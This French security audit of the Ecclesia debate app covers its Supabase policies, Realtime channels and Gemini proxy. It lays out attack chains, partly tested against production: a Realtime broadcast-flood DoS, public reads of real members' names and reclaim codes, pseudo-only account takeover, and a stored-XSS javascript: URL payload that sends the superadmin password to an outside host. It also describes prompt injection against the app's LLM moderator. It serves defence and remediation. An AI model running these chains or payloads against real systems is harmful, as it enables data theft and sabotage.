# Audit de sécurité — Ecclesia Modérateur de débat

**Date** : 2026-08-03
**Périmètre** : app web (`src/`, `supabase/`), base Supabase `plpjiehqsxxakbuykmkm` (schéma réel en production), Edge Function `gemini-proxy`, chaîne de déploiement GitHub Pages.
**Hors périmètre** : sous-projet `transcription-debat/` (voir §6).
**Méthode** : analyse statique du code + lecture du schéma réel en base (policies RLS, corps des fonctions `SECURITY DEFINER`, grants, advisors Supabase) + **tests actifs ciblés contre la production**, menés avec la vraie clé `anon` (celle du bundle JS public), la séance n'étant pas en cours (aucun débat live avant plusieurs mois).

**Tests actifs réalisés (2026-08-03)** — tous en tant qu'attaquant anonyme, sans aucun secret :
- **A1 confirmé** : deux clients anonymes distincts sur un canal `table:<id>` — l'un émet un `broadcast` `refresh`, l'autre le reçoit, avec la forme de payload exacte que l'app traite. Le DoS Realtime est ouvert.
- **B4 confirmé** : `GET /rest/v1/session_members` en anonyme retourne noms/pseudos et **29 codes de rappel en clair** (`Content-Range: 0-28/29`).
- **B6 confirmé** : `GET /rest/v1/sessions` en anonyme retourne titres, `join_code` et URLs de docs de toutes les séances.
- **A1 (lecture) confirmé** : `GET /rest/v1/table_assignments` en anonyme retourne tous les `table_id`/`session_id`.

**Secrets** (information fournie par le responsable, non vérifiée par force brute) : code Ecclesia et mot de passe superadmin font ~12 caractères, majoritairement des lettres avec quelques caractères spéciaux. Cela rend le brute-force en ligne **hors de portée** et rétrograde A3 (voir §3).

**Données réelles** : la base de production **contient de vraies données de séances passées** (participants réels). Les fuites en lecture (bloc B) ne sont donc pas théoriques — elles exposent des données personnelles réelles **en ce moment**.

> Ce document est un **constat**, pas un plan. Il est destiné à alimenter une conversation ultérieure qui découpera les chantiers de correction.

---

## 1. Modèle de menace retenu

| | |
|---|---|
| **Attaquant** | Étudiant·e de l'école, spécialité cybersécurité. Compétent, outillé, motivé par le défi. Agit seul ou en petit groupe (3-10 personnes). Pas d'infrastructure lourde, pas de 0-day. |
| **Accès de départ** | Aucun secret. La clé `anon` Supabase et l'URL du projet sont dans le bundle JS public ; le code source complet est sur GitHub (dépôt public), migrations SQL incluses. **L'attaquant connaît donc tout le schéma, toutes les signatures RPC et toutes les policies RLS.** |
| **Objectif 1 (prioritaire)** | Interrompre une séance de débat en cours. |
| **Objectif 2** | Détruire des données. |

**Conséquence du dépôt public** : la sécurité par l'obscurité est nulle ici. Chaque `RAISE EXCEPTION`, chaque `ON CONFLICT DO UPDATE`, chaque `USING (true)` est lisible à l'avance. Ce n'est pas une vulnérabilité en soi — c'est le bon choix — mais cela signifie que **toute défense doit tenir face à un attaquant qui a lu le code**. Plusieurs des failles ci-dessous ne tiennent aujourd'hui que parce qu'on suppose l'inverse.

### Correction au modèle de menace initial

L'hypothèse de départ était : « la prise du rôle de modérateur est un risque faible : il ne peut ni supprimer de données, ni supprimer la table ». **C'est faux.**

La policy `tables_delete_moderator` autorise `DELETE` dès que `auth.uid() = created_by`, et `reclaim_moderator` / `designate_moderator` réécrivent précisément `created_by`. Un modérateur usurpé peut donc supprimer la table, ce qui **cascade** sur `participants`, `queue_entries` et `speaking_turns` (`ON DELETE CASCADE`).

La prise de modération est donc **destructrice**, et non seulement gênante. Elle relève de l'objectif 1 *et* de l'objectif 2. Cela remonte la priorité de tout le bloc A.

---

## 2. Synthèse — par priorité

| ID | Vulnérabilité | Gravité | Secret requis | Interruption | Destruction | Statut |
|---|---|---|---|---|---|---|
| **A1** | Canal Realtime public + `table_id` publics → DoS de toutes les tables | 🔴 Critique | aucun | ✅ totale | — | **confirmé (test actif)** |
| **B4** | `session_members` en lecture publique : codes de rappel en clair + noms réels | 🔴 Critique | aucun | — | — (fuite RGPD **réelle, en cours**) | **confirmé (test actif)** |
| **B1** | XSS stocké (sources collab) → vol du mot de passe superadmin → `delete_session` | 🔴 Critique | aucun (1 clic superadmin) | ✅ totale | ✅ totale | confirmé au niveau code |
| **A2** | Code Ecclesia unique et partagé → prise de contrôle de **toutes** les tables, puis suppression | 🔴 Critique | code Ecclesia + join_code | ✅ totale | ✅ | confirmé au niveau code |
| **B3** | Prise de contrôle de n'importe quel membre par **pseudo seul** | 🟠 Élevé | aucun | ✅ | ✅ | confirmé au niveau code |
| **A4** | `designate_moderator` : tout participant s'empare d'une table leaderless, puis la supprime | 🟠 Élevé | join_code | ✅ | ✅ | confirmé au niveau code |
| **B2** | `register_collab_pseudo` : vol d'identité + destruction des sources d'autrui | 🟠 Élevé | aucun | — | ✅ | confirmé au niveau code |
| **A5** | Inscription de masse non bornée → allocation faussée | 🟡 Moyen | aucun | ✅ (jour J) | — | code (débit à vérifier) |
| **A6** | `join_table` : vol d'identité de participant | 🟡 Moyen | join_code | ✅ partielle | ✅ partielle | confirmé au niveau code |
| **B5** | Désanonymisation des auteurs d'assertions | 🟡 Moyen | aucun | — | — (fuite) | confirmé au niveau code |
| **B6** | `sessions` en lecture publique (join_code, docs internes) | 🟡 Moyen | aucun | — | — (fuite) | **confirmé (test actif)** |
| **C1** | `gemini-proxy` sans quota ni limite de débit | 🟡 Moyen | aucun | ✅ (mode `ai`) | — | confirmé au niveau code |
| **C2** | Injection de prompt via le contenu des assertions | 🟡 Moyen | inscription | — | ✅ (votes) | plausible |
| **A3** | Oracles de mot de passe sans limitation de débit + bcrypt coût 6 | 🟢 Faible | aucun | ✅ (via superadmin) | ✅ | rétrogradé (secrets ~12 car.) |
| **C3** | `add_to_queue` échoue en ouverture si `auth.uid()` est NULL | 🟢 Faible | — | — | — | confirmé au niveau code |
| **C4** | Aucune limite de longueur ni de débit sur les soumissions | 🟢 Faible | inscription | ✅ partielle | — | confirmé au niveau code |
| **C5** | 76 fonctions `SECURITY DEFINER` à `search_path` mutable | 🟢 Faible | — | — | — | non exploitable en l'état |
| **C6** | Mot de passe superadmin en clair dans `sessionStorage` et en argument de chaque RPC | 🟢 Faible | — | — | — | confirmé au niveau code |
| **C7** | Un modérateur peut réécrire le `join_code` de sa table | 🟢 Faible | modération | ✅ partielle | — | confirmé au niveau code |

**Les quatre à traiter en premier** : A1, B4, B1, A2.
- **A1** ne coûte rien à l'attaquant, ne demande aucun secret, et arrête toutes les tables à la fois — c'est le chemin le plus court, et il est **confirmé exploitable**.
- **B4** est le seul point qui est un problème **maintenant** : de vraies données personnelles (noms + 29 codes de rappel) sont lisibles par n'importe qui, sans attendre aucune séance. C'est une fuite active.
- **B1** et **A2** sont les deux chemins vers l'arrêt + destruction complète.

---

## 3. Bloc A — Interruption de séance

### A1 — 🔴 Canal Realtime public + `table_id` lisibles par tous → DoS de toutes les tables — **CONFIRMÉ (test actif)**

> **Confirmé le 2026-08-03 contre la production.** Deux clients anonymes distincts (deux `createClient` avec la clé anon publique, sans `signIn`) sur un même canal `table:<id>` : le premier s'abonne, le second appelle `send({type:'broadcast', event:'refresh', payload:{tables:['tables','participants']}})`. Le premier **reçoit le message**. C'est exactement le déclencheur que `TableContext.tsx:229` traite en appelant `refetch(payload.tables)`. Aucun secret, aucune session utilisateur.

**Chaîne**

1. `table_assignments` a pour policy `SELECT USING (true)`. N'importe qui, avec la seule clé `anon` (publique, extraite du bundle JS), lit **tous les `table_id` de toutes les séances** :
   ```
   GET /rest/v1/table_assignments?select=table_id,session_id,table_number
   ```
2. `src/context/TableContext.tsx:161` ouvre `supabase.channel(\`table:${tableId}\`)` **sans** `{ config: { private: true } }`. C'est donc un canal Realtime **public** : tout porteur de la clé anon peut s'y abonner *et y émettre*.
3. `src/context/TableContext.tsx:229-232` réagit à tout message `broadcast` d'événement `refresh` en appelant `refetch(payload.tables)` — sans aucune vérification. Le commentaire du code le dit lui-même : `// Broadcast — instant refresh signal (no RLS check)`.

**Impact** — L'attaquant émet en boucle des `refresh` sur les canaux de toutes les tables actives. Chaque client connecté refetch `tables`, `participants`, `queue_entries`, `speaking_turns` à chaque message. À quelques centaines de messages/seconde : interfaces figées sur tous les téléphones de la salle, saturation du pooler Supabase, plus aucun tour de parole utilisable. **Toutes les tables simultanément, sans connaître un seul secret.**

C'est réversible (l'attaque cesse, l'app repart) mais la séance est bloquée pendant toute sa durée, et rien dans l'app ne permet de l'identifier ou de la bloquer.

**Preuves** : policy `table_assignments_select` (`qual = true`) ; [TableContext.tsx:161](src/context/TableContext.tsx:161) ; [TableContext.tsx:229](src/context/TableContext.tsx:229).

**Direction de correction** — Passer les canaux en `private: true` (Realtime Authorization, policies sur `realtime.messages`), et/ou cesser de faire confiance au payload d'un broadcast pour déclencher un refetch (débounce serré, plafond de fréquence côté client). Restreindre `table_assignments` en lecture.

---

### A2 — 🔴 Code Ecclesia unique et partagé → prise de contrôle de toutes les tables, puis suppression

**Le problème structurel** : il n'existe **qu'un seul** `creation_code_hash` pour toute l'association. Le même secret sert à :
- créer une table (`create_table`),
- **reprendre la modération de n'importe quelle table** (`reclaim_moderator`),
- se déclarer modérateur d'une séance (`claim_moderator_status`).

Ce code est donc, par construction, connu de **tous les animateurs**, et il est prononcé/affiché en salle le jour de la séance. Il n'y a aucun secret propre à une table.

**Chaîne**

1. Obtenir le code Ecclesia (fuite sociale, épaule, ancien animateur, ou brute-force — cf. A3).
2. Obtenir le `join_code` d'une table (6 hex). Il est distribué aux participants de la table, affiché en QR code, et présent dans l'URL. Un seul participant complice suffit ; sinon brute-force sur `join_table` (~16,7 M combinaisons, sans aucune limitation de débit).
3. `reclaim_moderator(join_code, code)` → `UPDATE tables SET created_by = auth.uid()`.
   Le modérateur légitime perd la main **instantanément** : `TableContext.tsx:169-171` écoute l'UPDATE Realtime et bascule `isModerator` à `false` sur son écran. Il peut re-`reclaim`, mais l'attaquant aussi — boucle sans vainqueur.
4. Une fois `created_by`, tout est ouvert : `grant_floor`, `end_turn`, `kick_participant` (supprime des lignes `participants`), `correct_turn` (réécrit l'historique des tours), et surtout **`DELETE FROM tables`** via la policy `tables_delete_moderator` → cascade sur `participants`, `queue_entries`, `speaking_turns`.

**Impact** — Un petit groupe qui connaît le code Ecclesia prend toutes les tables l'une après l'autre et les supprime. La séance s'arrête, les données de parole sont perdues. C'est exactement le scénario redouté, et il est aujourd'hui à portée de main.

**Preuves** : `reclaim_moderator(p_join_code, p_moderator_code)` et sa variante à 3 arguments ; policy `tables_delete_moderator` (`USING (auth.uid() = created_by)`).

**Direction de correction** — Découpler le secret de reprise du secret de création ; le rendre propre à chaque table (ou à chaque séance) et à durée de vie limitée. Retirer le `DELETE` direct aux modérateurs (le passer en RPC superadmin, ou en soft-delete). Journaliser les changements de `created_by`.

---

### A3 — 🟢 Oracles de mot de passe sans limitation de débit + bcrypt coût 6 — **rétrogradé**

> **Rétrogradé de 🟠 à 🟢** après information sur l'entropie des secrets : le code Ecclesia et le mot de passe superadmin font ~12 caractères, majoritairement des lettres. Un brute-force en ligne est **hors de portée** : même en ignorant bcrypt et en supposant 1 000 essais/seconde soutenus à travers le réseau, l'espace de 26¹² (≈ 10¹⁷) demande des millions d'années. La faille structurelle demeure (voir ci-dessous) mais n'est plus une menace d'attaque directe ; elle reste un **durcissement** souhaitable et une assurance en cas de fuite d'un secret.

**Constat mesuré en base** : les deux hashs de `app_config` sont en `$2a$06$` — **coût 6, soit 64 itérations**, le défaut de `gen_salt('bf')` de pgcrypto. C'est environ **1 ms de CPU par essai**. Ce coût faible ne compte que dans un scénario de **fuite du hash** — or `app_config` est verrouillée (zéro policy, cf. §6), le hash ne sort jamais par l'API. Le risque résiduel est donc un accès direct à la base (sauvegarde exfiltrée, poste admin compromis), cas où un coût 12+ ralentirait le craquage hors ligne.

**Oracles disponibles** (tous exécutables par le rôle `anon` via `/rest/v1/rpc/`) :

| Secret | Oracle | Nature |
|---|---|---|
| Mot de passe superadmin | `check_superadmin_password(p_password)` | **oracle pur** — ne fait rien d'autre que valider. Idéal pour du brute-force. |
| Code Ecclesia | `create_table`, `reclaim_moderator`, `claim_moderator_status` | oracle avec effet de bord, mais l'erreur distingue clairement « code invalide » du reste. |

Aucune limitation de débit, aucun verrouillage après N échecs, aucune journalisation des tentatives, aucun captcha. La distinction des messages d'erreur (`'Mot de passe superadmin incorrect'` vs `'Séance introuvable'`) donne en plus un signal net.

**Impact résiduel** — Le brute-force en ligne étant écarté par l'entropie des secrets, le risque restant est : (a) un secret qui fuite par un autre canal (partage, capture d'écran, XSS de B1) reste utilisable sans limite ni journalisation ; (b) `check_superadmin_password` reste un oracle silencieux permettant de tester un secret volé sans laisser de trace.

**Direction de correction** (durcissement, non urgent) — Placer `check_superadmin_password` derrière une limitation de débit ; journaliser les échecs ; remonter le coût bcrypt (12+) à la prochaine rotation ; uniformiser les messages d'erreur.

---

### A4 — 🟠 `designate_moderator` : tout participant s'empare d'une table leaderless

`designate_moderator(p_table_id)` ne demande **aucun code**. Ses seules conditions : la table est `leaderless`, et l'appelant est participant de cette table. Elle fait alors :

```sql
UPDATE tables SET leaderless = false, created_by = auth.uid()
```

C'est **premier arrivé, premier servi et irréversible** : tout appel ultérieur échoue sur `'Cette table a déjà un animateur'`. L'attaquant qui rejoint une table sans animateur et appelle cette RPC immédiatement (avant tout humain) en devient propriétaire — puis peut la supprimer via `tables_delete_moderator`.

**Impact** — Détournement puis destruction d'une table sans animateur, avec pour seul prérequis son `join_code`. 2 tables `leaderless` existent actuellement en base.

**Direction de correction** — Rendre la désignation révocable par le superadmin, ou exiger une confirmation, ou dissocier « animer » de « pouvoir supprimer ».

---

### A5 — 🟡 Inscription de masse non bornée → allocation faussée le jour J

`sessions` a pour policy `SELECT USING (true)` : **toutes les séances, avec leur `join_code`, sont publiques**. `register_session_member(session_id, pseudo)` ne demande aucun secret et n'a aucun quota. En phase `voting`, elle pose `attending_in_person = true` d'office.

**Impact** — Un script inscrit N faux membres « présents ». `run_clustering_v2` / `apply_allocation` filtrent sur `attending_in_person = true` : ils dimensionnent donc des tables pour des gens qui n'existent pas. Le jour de la séance : trop de tables, tables à moitié vides, répartition absurde. L'allocation v2 est conçue pour ne jamais échouer — elle produira donc silencieusement un résultat faux, ce qui est ici le pire cas.

**Atténuation partielle** — Supabase limite les `signInAnonymously` par IP (défaut : 30/heure). Cela borne le débit mais pas le volume (VPN, plusieurs machines). **À vérifier dans la configuration réelle du projet.**

---

### A6 — 🟡 `join_table` : vol d'identité de participant

```sql
INSERT INTO participants (table_id, user_id, pseudo)
VALUES (v_table_id, auth.uid(), p_pseudo)
ON CONFLICT (table_id, pseudo) DO UPDATE SET user_id = EXCLUDED.user_id
```

Rejoindre une table avec le pseudo d'un autre **transfère sa ligne** à l'appelant. C'est voulu (retour depuis un autre appareil), mais il n'y a aucune preuve de possession.

Tout participant d'une table lit les pseudos de tous les autres (policy `participants_select`). Il peut donc s'emparer de l'identité de n'importe lequel d'entre eux — y compris de la ligne `participants` du modérateur (ce qui ne donne pas `created_by`, mais éjecte le modérateur de sa propre identité, de la file et de son historique de parole).

**Impact** — Désordre en séance, pertes d'historique, participants qui « disparaissent ». Pas d'arrêt net, mais une table rendue impraticable.

---

## 4. Bloc B — Destruction de données et fuites

### B1 — 🔴 XSS stocké → vol du mot de passe superadmin → suppression de la séance

**La chaîne complète, sans aucun secret au départ :**

1. **Énumérer les séances.** `sessions` a pour policy `SELECT USING (true)` → tous les `session_id` sont publics.
2. **S'enregistrer sur le doc collaboratif.** `register_collab_pseudo(session_id, pseudo)` ne vérifie **ni l'appartenance à la séance, ni aucun code**. N'importe quel utilisateur anonyme passe.
3. **Déposer une source piégée.** `add_collab_source(session_id, title, url, content)` stocke `url` telle quelle, sans validation de schéma. L'attaquant pose :
   `url = "javascript:fetch('https://…/x?p='+sessionStorage.getItem('<clé du mot de passe>'))"`, avec un `title` engageant.
4. **React ne bloque pas.** Vérifié dans `node_modules/react-dom` : en React 18, `sanitizeURL` se contente d'un `console.error` en développement (`'A future version of React will block javascript: URLs…'`) et **ne neutralise pas l'URL**. En build de production, ce bloc est supprimé — l'attribut `href` est écrit tel quel. Le rendu se fait sans validation en [SuperadminScreen.tsx:4396](src/screens/SuperadminScreen.tsx:4396) et [CollabDocScreen.tsx:593](src/screens/CollabDocScreen.tsx:593).
5. **Le mot de passe est en clair, même origine.** [SuperadminScreen.tsx:52-54](src/screens/SuperadminScreen.tsx:52) : `sessionStorage.getItem/setItem` du mot de passe superadmin en clair. Le JS injecté s'exécute sur `ecclesia-cs.github.io` — même origine, aucune barrière.
6. **Exploitation.** Avec le mot de passe : `delete_session(password, session_id)` → **la séance en cours disparaît pour tout le monde**, avec cascade sur membres, assertions, votes, analyses et affectations. Ou plus discret : `set_session_phase(password, session_id, 'closed')`.

**Prérequis** : que le superadmin **clique** sur la source piégée. Le titre étant contrôlé par l'attaquant, c'est une question de formulation, pas de chance. Le panneau des sources est justement consulté pendant la préparation d'une séance.

**Impact** — C'est le seul chemin qui mène d'un accès nul au privilège maximal. Il combine les deux objectifs de l'attaquant.

**Note** : `session_sources` contient **0 ligne** aujourd'hui — l'impact actuel est nul, mais la fonctionnalité est en ligne et exploitable dès la prochaine séance qui l'utilise.

**Autres puits `innerHTML` examinés, non exploitables** :
- `QrCodeModal.tsx:31` — le SVG vient de la bibliothèque `qrcode` à partir d'un `join_code`. Sûr.
- `NotesModal.tsx:58,109` — contenu de notes privées, policy owner-only (`user_id = auth.uid()`). Self-XSS seulement.

**Direction de correction** — Valider le schéma d'URL à l'écriture *et* à l'affichage (n'autoriser que `http:`/`https:`) ; sortir le mot de passe superadmin de `sessionStorage` (session à jeton opaque côté serveur) ; exiger l'appartenance à la séance pour `register_collab_pseudo`.

---

### B2 — 🟠 `register_collab_pseudo` : vol d'identité et destruction des sources d'autrui

```sql
INSERT INTO collab_session_users (session_id, pseudo, user_id) VALUES (…)
ON CONFLICT (session_id, pseudo) DO UPDATE SET user_id = EXCLUDED.user_id;

UPDATE session_sources SET user_id = auth.uid()
WHERE session_id = p_session_id AND pseudo = p_pseudo;
```

La fonction **revendique le pseudo sans aucune preuve** *et* transfère à l'appelant **toutes les sources déjà déposées sous ce pseudo**. Or `collab_session_users` a pour policy `SELECT USING (true)` : tous les pseudos sont publics.

**Chaîne** — Lire les pseudos → `register_collab_pseudo` avec le pseudo d'un autre → hériter de ses sources → `delete_collab_source` (qui vérifie `user_id = auth.uid()`, condition désormais remplie) → **tout supprimer**. Ou `update_collab_source` pour altérer le contenu sans que personne ne le voie.

**Impact** — Destruction de données sans aucun secret. Aujourd'hui sans effet (0 source en base), mais c'est une bombe à retardement sur une fonctionnalité en production.

---

### B3 — 🟠 Prise de contrôle de n'importe quel membre de séance, par pseudo seul

`confirm_attendance(p_session_id, p_pseudo, p_code)`, **cas 3** : si l'appelant n'a pas encore de ligne `session_members` et que `p_pseudo` correspond à un membre existant :

```sql
UPDATE session_members SET user_id = v_caller, attending_in_person = true
WHERE id = v_target.id;
```

**Aucun code n'est demandé.** Le pseudo seul suffit — et les pseudos sont publics (B4). La condition « l'appelant n'a pas de ligne membre » se contourne par un `signInAnonymously()` neuf à chaque victime.

**Impact** — L'attaquant s'empare de l'inscription de n'importe quel membre. La victime perd ses votes, son onboarding, son affectation de table, et se retrouve exclue de sa propre séance. Répété sur les 96 membres actuels : séance détruite sans qu'aucun secret n'ait été utilisé.

**Note de conception** — `reclaim_prevoting_member` (chantier B3) a été écrite avec plus de soin (garde de phase, pas d'effet sur `attending_in_person`), mais elle accepte elle aussi le pseudo seul. Le problème est le même.

---

### B4 — 🔴 `session_members` en lecture publique : codes de rappel en clair et noms réels — **CONFIRMÉ, fuite active**

> **Remonté de 🟠 à 🔴.** C'est la seule vulnérabilité qui cause un préjudice **dès maintenant**, sans attendre aucune séance : la base de production contient de vraies données, et elles sont lisibles par quiconque possède la clé anon (c.-à-d. quiconque ouvre le bundle JS du site).
>
> **Confirmé le 2026-08-03** : `GET /rest/v1/session_members?select=pseudo,reclaim_code,is_moderator` avec la clé anon publique retourne les lignes en clair. `Content-Range: 0-28/29` sur le filtre `reclaim_code=not.is.null` → **29 codes de rappel à 4 chiffres exposés en clair**.

Policy `session_members_select` : **`USING (true)`**. La table expose :

| Colonne | Contenu | Conséquence |
|---|---|---|
| `pseudo` | **nom et prénom réels** (l'app demande explicitement « nom prénom ») | fuite RGPD directe |
| `reclaim_code` | **code de rappel en clair** (4 chiffres) | prise d'identité via `confirm_attendance` / `reclaim_prevoting_member` |
| `user_id` | identifiant d'auth | corrélation entre séances |
| `is_moderator` | statut de modérateur | désigne les cibles prioritaires à un attaquant |
| `attending_in_person` | présence physique | fuite de présence |

**État actuel en base** : **96 membres, 92 noms distincts, 29 codes de rappel en clair, 3 modérateurs identifiables.** Ces données sont, à cet instant, lisibles par toute personne disposant de la clé anon — c'est-à-dire par quiconque ouvre le bundle JS du site public.

```
GET /rest/v1/session_members?select=pseudo,reclaim_code,is_moderator
```

Le code de rappel fait 4 chiffres (`maxLength={4}` dans `VoteScreen.tsx`) : même sans cette fuite, 10 000 essais sans aucune limitation de débit le rendent trivial.

**C'est la fuite la plus grave du rapport en termes de données personnelles**, et elle alimente directement B3.

---

### B5 — 🟡 Désanonymisation des auteurs d'assertions

`assertions` expose `member_id` (policy `assertions_select_approved`, qui laisse passer toutes les colonnes des lignes `approved`). Croisé avec `session_members` (lisible, B4), on obtient **le nom réel de l'auteur de chaque assertion approuvée** — 112 assertions actuellement.

Cela va à l'encontre de l'intention de la migration `20260721_hide_assertion_author`, qui masquait l'auteur côté interface. Le masquage est purement cosmétique : la donnée sort par l'API.

Dans un débat sur des sujets clivants, savoir qui a proposé quoi est précisément ce qu'on ne veut pas exposer.

---

### B6 — 🟡 `sessions` en lecture publique

Policy `sessions_select` : `USING (true)`. Exposent notamment : `join_code`, `title`, `description`, `doc_info_url`, `doc_summary_url`, `doc_collab_url`, `group_names`, `phase`.

**Conséquences** — Énumération de toutes les séances passées et à venir ; accès aux documents internes de préparation (si les URL ne sont pas elles-mêmes protégées) ; et surtout le `join_code` de séance, qui donne l'entrée dans `#vote/<join_code>` de n'importe quelle séance — porte d'entrée de A5.

---

## 5. Bloc C — Intégrité, abus, durcissement

### C1 — 🟡 `gemini-proxy` : aucun quota, aucune limitation de débit

L'authentification se limite à `supabase.auth.getUser()` sur le JWT ([index.ts:490-510](supabase/functions/gemini-proxy/index.ts)). Or **n'importe qui obtient un JWT valide** via `signInAnonymously()` — c'est le fonctionnement normal de l'app. Il n'y a ni contrôle du rôle superadmin, ni quota par utilisateur, ni plafond de taille de payload, ni limitation de débit.

**Impact** — Épuisement du quota / facturation de `GEMINI_API_KEY` par un tiers. Et si `moderation_policy = 'ai'`, la modération automatique cesse de fonctionner : les assertions ne sont plus filtrées pendant la séance.

### C2 — 🟡 Injection de prompt via le contenu des assertions

`serializeAssertions` insère le contenu brut des assertions dans le prompt de modération et de fusion. Un participant inscrit peut donc soumettre une assertion contenant des instructions destinées au modèle : faire approuver tout ce qui est en attente, ou faire proposer la fusion d'assertions légitimes distinctes.

Ce second cas est le plus dommageable : `apply_assertion_merge` **écrase des votes existants** (`disagree`/`pass` → `agree`) et rejette une assertion. Le delta est enregistré dans `assertion_merges` et `revert_assertion_merge` existe — c'est donc réparable, mais seulement si la manipulation est repérée.

**Atténuation en place** — La validation UUID côté Edge Function empêche les identifiants hallucinés d'atteindre la base. Elle ne protège en rien contre le détournement de la **décision** elle-même.

### C3 — 🟢 `add_to_queue` échoue en ouverture quand `auth.uid()` est NULL

```sql
IF auth.uid() != (SELECT user_id FROM participants WHERE id = p_participant_id)
   AND NOT EXISTS (SELECT 1 FROM tables WHERE id = p_table_id AND created_by = auth.uid())
THEN RAISE EXCEPTION 'Not authorized'; END IF;
```

Si `auth.uid()` est NULL (appel avec la seule clé anon, sans session utilisateur), `auth.uid() != …` vaut NULL, la condition entière vaut NULL, et **l'exception n'est pas levée**. Le contrôle est contourné.

L'exploitation demande de connaître un `participant_id`, qui n'est pas public aujourd'hui — l'impact réel est donc faible. Mais **le motif est à corriger** : c'est la seule fonction du schéma qui utilise une comparaison `!=` plutôt qu'un `NOT EXISTS` (qui, lui, échoue en fermeture). À ne pas reproduire.

### C4 — 🟢 Aucune limite de longueur ni de débit sur les soumissions

`submit_assertion` et `add_collab_source` n'imposent ni longueur maximale, ni quota, ni délai entre deux appels. Un flood d'assertions (112 aujourd'hui) noie le panneau de modération, gonfle le coût Gemini et rend l'écran de vote participant inutilisable.

### C5 — 🟢 76 fonctions `SECURITY DEFINER` à `search_path` mutable

Signalé par les advisors Supabase. **Non exploitable en l'état** : j'ai vérifié que ni `anon` ni `authenticated` n'ont le privilège `CREATE` sur le schéma `public` (`has_schema_privilege` → `false`). Le durcissement (`SET search_path = public, extensions`) reste souhaitable — une partie des fonctions récentes le fait déjà — mais ce n'est pas une urgence.

### C6 — 🟢 Mot de passe superadmin : stockage et transport

- En **clair dans `sessionStorage`** ([SuperadminScreen.tsx:52-54](src/screens/SuperadminScreen.tsx:52)) — c'est ce qui rend B1 exploitable.
- Transmis en **argument** de chacune des ~40 RPC superadmin : il apparaît donc dans le corps de chaque requête PostgREST. TLS protège le transport, mais le risque de journalisation (logs Postgres, logs PostgREST, traces d'erreur) **n'a pas été vérifié** — voir §6.
- Aucune rotation, aucune expiration de session, aucun second facteur.

### C7 — 🟢 Un modérateur peut réécrire le `join_code` de sa table

La policy `tables_update_moderator` (`USING/WITH CHECK auth.uid() = created_by`) porte sur **toutes les colonnes**, dont `join_code` et `session_id`. Un modérateur (légitime ou usurpé via A2/A4) peut changer le `join_code` : les QR codes et liens déjà distribués cessent alors de fonctionner. Nuisance, non destructif.

---

## 6. Ce qui n'a pas été exploré — travail restant

Cette section est à reprendre telle quelle dans le plan d'action : elle liste ce qu'il faudra **vérifier avant de conclure**.

### État des confirmations

Des tests actifs ciblés ont été menés le 2026-08-03 avec la clé anon de production (séance non live). Bilan :

| Point | État | Détail |
|---|---|---|
| **A1** (émission broadcast anon) | ✅ **confirmé actif** | deux clients anon : émission → réception. Le DoS Realtime est ouvert. |
| **B4** (lecture `session_members`) | ✅ **confirmé actif** | 29 codes de rappel en clair + noms lus via REST anon. |
| **B6** (lecture `sessions`) | ✅ **confirmé actif** | join_codes + titres + docs lus via REST anon. |
| **A1/A5** (lecture `table_assignments`, `sessions`) | ✅ **confirmé actif** | tous les `table_id`/`session_id` lus via REST anon. |
| **B1** — exécution `javascript:` dans le build prod | ⏳ **confirmé au niveau code**, pas testé en navigateur | React 18 `sanitizeURL` ne fait qu'un `console.error` en dev, supprimé en prod → l'`href` n'est pas neutralisé. Reste à valider par un clic réel sur le site déployé pour lever le dernier doute. |
| **B2, B3, A2, A4, A6** — RPC de vol d'identité / modération | ⏳ **confirmé au niveau code**, pas exécuté | non testées activement **volontairement** : elles écrivent sur de vraies données (transfert de `user_id`, `created_by`, suppression). Le code est sans ambiguïté ; les exécuter corromprait la base. |
| **A3** — débit de brute-force | ⚪ **sans objet** | secrets ~12 caractères → brute-force en ligne hors de portée quel que soit le débit. |

### Non audité

- **Configuration Auth Supabase** — limites de débit des `signInAnonymously` (défaut annoncé 30/h/IP, valeur réelle non vérifiée), captcha, durée de vie des JWT. Détermine la faisabilité réelle de A5 et B3 à grande échelle. L'advisor signale par ailleurs `auth_leaked_password_protection` désactivé.
- **Journaux Postgres et PostgREST** — le mot de passe superadmin, passé en argument, y apparaît-il ? (`log_statement`, journalisation des erreurs, `pg_stat_statements`). Question ouverte de C6.
- **Dépendances npm** — aucun `npm audit` lancé.
- **Realtime `postgres_changes`** — plusieurs tables sont en `REPLICA IDENTITY FULL` (nécessaire au fonctionnement). Le WAL transporte donc toutes les colonnes, y compris `reclaim_code`. Les abonnés recevant déjà ces lignes via la RLS permissive de B4, cela n'ajoute rien aujourd'hui — mais **ce point sera à revérifier après avoir resserré la RLS de `session_members`**, sous peine de refermer la porte tout en laissant la fenêtre ouverte.
- **Les ~40 RPC superadmin, une par une** — j'ai vérifié que le motif de contrôle du mot de passe est uniformément présent, mais je n'ai pas relu le corps de chacune (recherche d'injection SQL dynamique, de fuites dans les valeurs de retour, d'effets de bord). Les fonctions à `EXECUTE` correctement restreint (`postgres`, `service_role` seulement) sont `_apply_assertion_merge` et `_revert_assertion_merge` — **toutes les autres sont exécutables par `anon`**, ce qui est le modèle assumé du projet mais élargit d'autant la surface.
- **`transcription-debat/`** — hors périmètre, et le restera : la transcription ne passera plus par l'application (décision du responsable, 2026-08-03). Aucun audit prévu de ce côté.

### Vérifications positives (à ne pas refaire)

Pour éviter du travail inutile lors du plan d'action, voici ce qui a été **contrôlé et jugé correct** :

- **Les RPC de contrôle de table sont bien gardées.** `grant_floor`, `end_turn`, `kick_participant`, `correct_turn`, `reorder_queue_entry`, `move_queue_entry` vérifient toutes `created_by = auth.uid()` avec un `NOT EXISTS` (qui échoue en fermeture). `end_turn_as_speaker` et `claim_floor` vérifient correctement la qualité de l'appelant. **Il n'y a pas de contrôle de table possible sans être `created_by`** — le problème est en amont, dans la facilité à *devenir* `created_by` (A2, A4).
- **`app_config` est correctement verrouillée** : RLS activée, **zéro policy** → refus par défaut pour tous les rôles. Aucun hash ne peut sortir par l'API. La règle « aucun hash ne quitte jamais la base » est tenue.
- **Aucun secret dans l'historique git.** Recherche sur l'ensemble des branches : seul `.env.example` (valeurs factices) a jamais été commité. Aucune trace de `service_role`.
- **La chaîne CI est saine** : `deploy.yml` et le keep-alive n'injectent que `VITE_SUPABASE_URL` et `VITE_SUPABASE_ANON_KEY` depuis les secrets GitHub. Aucune clé privilégiée dans le bundle.
- **Pas d'injection SQL** dans les fonctions lues : tout passe par des requêtes paramétrées, aucun `EXECUTE format(...)` sur entrée utilisateur.
- **Pas de XSS ailleurs** : `QrCodeModal` (SVG généré par la bibliothèque `qrcode`) et `NotesModal` (notes privées, policy owner-only) sont sans risque exploitable par un tiers.
